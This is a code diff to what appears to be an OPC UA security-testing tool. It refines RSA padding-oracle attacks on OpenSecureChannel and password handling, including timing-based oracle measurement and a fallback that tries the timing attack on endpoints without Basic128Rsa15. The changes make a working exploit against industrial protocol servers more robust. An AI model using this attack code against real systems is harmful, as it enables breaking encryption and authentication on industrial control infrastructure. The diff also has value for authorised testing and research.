@@ -633,11 +633,11 @@ class OPNPaddingOracle(PaddingOracle):
       
   @classmethod
   def pick_endpoint(clazz, endpoints):
-    for endpoint in endpoints:
-      if endpoint.securityPolicyUri == SecurityPolicy.BASIC128RSA15 and endpoint.transportProfileUri.endswith('uatcp-uasc-uabinary'):
-        return endpoint
-        
-    return None
+    return max(
+      (ep for ep in endpoints if ep.transportProfileUri.endswith('uatcp-uasc-uabinary')),
+      key=lambda ep: ep.securityPolicyUri == SecurityPolicy.BASIC128RSA15,
+      default=None
+    )
     
 class PasswordPaddingOracle(PaddingOracle):
   def __init__(self, 
@@ -775,13 +775,12 @@ class TimingBasedPaddingOracle(PaddingOracle):
   def _attempt_query(self, ciphertext):
     self._base._setup()
     payload = ciphertext * self._expansion
+    start = time.time()
     try:
-      start = time.time()
       retval = self._base._attempt_query(payload)
-      duration = time.time() - start
-    except TimeoutError:
+    except:
       retval = False
-      duration = PO_SOCKET_TIMEOUT
+    duration = time.time() - start
       
     try:
       self._base._cleanup()
@@ -795,12 +794,12 @@ class TimingBasedPaddingOracle(PaddingOracle):
       # Padding seems correct. Repeat with clean connections to gain certainty.
       for i in range(0, self._repeats):
         self._base._setup()
+        start = time.time()
         try:
-          start = time.time()
           self._base._attempt_query(payload)
-          duration = time.time() - start
-        except TimeoutError:
-          duration = PO_SOCKET_TIMEOUT
+        except:
+          pass
+        duration = time.time() - start
           
         try:
           self._base._cleanup()
@@ -1011,8 +1010,16 @@ def find_padding_oracle(url : str, try_opn : bool, try_password : bool, timing_t
       log(f'Trying a bunch of known plaintexts to assess {oname} oracle quality and reliability...')
       oracle = oclass(endpoint)
       try:
-        quality = padding_oracle_quality(endpoint.serverCertificate, oracle)
-        log(f'{oname} padding oracle score: {quality}/100')
+        try:
+          quality = padding_oracle_quality(endpoint.serverCertificate, oracle)
+          log(f'{oname} padding oracle score: {quality}/100')
+        except ServerError as err:
+          log(f'Got server error {hex(err.errorcode)} ("{err.reason}"). Don\'t know how to interpret it. Skipping {oname} oracle.')
+          quality = 0
+        except Exception as ex:
+          log(f'Exception {type(ex).__name__} raised ("{ex}"). Skipping {oname} oracle.')
+          quality = 0
+        
         if quality == 100:
           log(f'Great! Let\'s use it.')
           return oracle, endpoint
@@ -1344,7 +1351,7 @@ def server_checker(url : str, test_timing_attack : bool):
   pkcs1_ep = None
   
   log('-----------------------')
-  for i, ep in enumerate(endpoints):
+  for i, ep in enumerate(endpoints, start=1):
     epname = f'Endpoint #{i} ({ep.endpointUrl})'
     log_object(epname, ep)
     log('-----------------------')
@@ -1396,63 +1403,66 @@ def server_checker(url : str, test_timing_attack : bool):
     log('No findings about these endpoints.')
     
   log('Note: cn-inject vulnerabilities have not been checked.')
+  if not test_timing_attack and not pkcs1_ep:
+    log('Note: Even when Basic128Rsa15 is not supported, the padding oracle may still work. Try running with -t.')
     
   if test_timing_attack:
     if not pkcs1_ep:
-      log('No endpoint with Basic128Rsa15. Can\'t test timing attack.')
-    else:
-      log('Testing OpenSecureChannel timing attack...')
-      results = {}
-      for expandval in [30,50,100]:
-        log(f'Expansion parameter {expandval}:')
-        keylen = certificate_publickey(pkcs1_ep.serverCertificate).size_in_bytes()
-        n, e = certificate_publickey_numbers(pkcs1_ep.serverCertificate)
-        okpads = 50
-        nokpads = 50
-        ok_time = 0
-        nok_time = 0
-        minok = math.inf
-        maxnok = 0
-        for i, (padding_ok, plaintext) in enumerate(padding_oracle_testinputs(keylen, n, okpads, nokpads), start=1):
-          inputval = int2bytes(pow(plaintext, e, n), keylen) * expandval
-          oracle = OPNPaddingOracle(pkcs1_ep)
-          oracle._setup()
-          starttime = time.time()
-          try:
-            oracle._attempt_query(inputval)
-          except:
-            pass
-          duration = time.time() - starttime
-          
-          log(f'Test {i}: {"good" if padding_ok else "bad"} padding; time: {duration}')
-          if padding_ok:
-            ok_time += duration
-            minok = min(duration, minok)
-          else:
-            nok_time += duration
-            maxnok = max(duration, maxnok)
-          
-          try:
-            oracle._cleanup()
-          except:
-            pass
+      i, pkcs1_ep = max(enumerate(endpoints, start=1), key=lambda i_ep: i_ep[1].securityPolicyUri != SecurityPolicy.NONE)
+      log(f'No endpoint advertising Basic128Rsa15. Trying Endpoint #{i} with policy {pkcs1_ep.securityPolicyUri.value} instead.')
+    
+    log('Testing OpenSecureChannel timing attack...')
+    results = {}
+    for expandval in [30,50,100]:
+      log(f'Expansion parameter {expandval}:')
+      keylen = certificate_publickey(pkcs1_ep.serverCertificate).size_in_bytes()
+      n, e = certificate_publickey_numbers(pkcs1_ep.serverCertificate)
+      okpads = 50
+      nokpads = 50
+      ok_time = 0
+      nok_time = 0
+      minok = math.inf
+      maxnok = 0
+      for i, (padding_ok, plaintext) in enumerate(padding_oracle_testinputs(keylen, n, okpads, nokpads), start=1):
+        inputval = int2bytes(pow(plaintext, e, n), keylen) * expandval
+        oracle = OPNPaddingOracle(pkcs1_ep)
+        oracle._setup()
+        starttime = time.time()
+        try:
+          oracle._attempt_query(inputval)
+        except:
+          pass
+        duration = time.time() - starttime
         
-        results[expandval] = {
-          'avgok': ok_time / okpads,
-          'minok': minok,
-          'avgnok': nok_time / nokpads,
-          'maxnok': maxnok
-        }
-        log('-----------------')
-          
-      log('Timing experiment results:')
-      for expandval, result in results.items():
-        log_success(f'Expansion parameter {expandval}:')
-        log_success(f'Average time with correct padding: {result["avgok"]}')
-        log_success(f'Average time with incorrect padding: {result["avgnok"]}')
-        log_success(f'Shortest time with correct padding: {result["minok"]}')
-        log_success(f'Longest time with incorrect padding: {result["maxnok"]}')
-        log_success('-----------------')
+        log(f'Test {i}: {"good" if padding_ok else "bad"} padding; time: {duration}')
+        if padding_ok:
+          ok_time += duration
+          minok = min(duration, minok)
+        else:
+          nok_time += duration
+          maxnok = max(duration, maxnok)
+        
+        try:
+          oracle._cleanup()
+        except:
+          pass
+      
+      results[expandval] = {
+        'avgok': ok_time / okpads,
+        'minok': minok,
+        'avgnok': nok_time / nokpads,
+        'maxnok': maxnok
+      }
+      log('-----------------')
+        
+    log('Timing experiment results:')
+    for expandval, result in results.items():
+      log_success(f'Expansion parameter {expandval}:')
+      log_success(f'Average time with correct padding: {result["avgok"]}')
+      log_success(f'Average time with incorrect padding: {result["avgnok"]}')
+      log_success(f'Shortest time with correct padding: {result["minok"]}')
+      log_success(f'Longest time with incorrect padding: {result["maxnok"]}')
+      log_success('-----------------')
 
 
 def auth_check(url : str, skip_none : bool, demo : bool):
